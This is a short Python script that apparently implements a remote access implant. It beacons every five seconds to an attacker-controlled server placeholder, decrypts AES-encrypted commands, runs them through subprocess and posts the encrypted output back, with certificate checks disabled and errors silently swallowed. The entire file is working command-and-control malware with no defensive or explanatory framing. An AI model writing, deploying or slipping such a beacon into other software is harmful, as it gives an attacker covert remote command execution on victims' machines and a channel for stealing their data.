import base64, subprocess, requests, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

SERVER_URL = "https://YOUR_ATTACKER_IP:443"
KEY = b"ThisIsASecretKey"  # Must be 16, 24, or 32 bytes
BLOCK_SIZE = 16

def encrypt(data):
    cipher = AES.new(KEY, AES.MODE_CBC)
    ct = cipher.encrypt(pad(data.encode(), BLOCK_SIZE))
    return base64.b64encode(cipher.iv + ct).decode()

def decrypt(enc):
    raw = base64.b64decode(enc)
    iv = raw[:BLOCK_SIZE]
    ct = raw[BLOCK_SIZE:]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), BLOCK_SIZE).decode()

def beacon():
    while True:
        try:
            r = requests.get(SERVER_URL, verify=False)
            if r.status_code == 200:
                cmd = decrypt(r.text)
                output = subprocess.getoutput(cmd)
                requests.post(SERVER_URL, data=encrypt(output), verify=False)
        except:
            pass
        time.sleep(5)

if __name__ == "__main__":
    beacon()
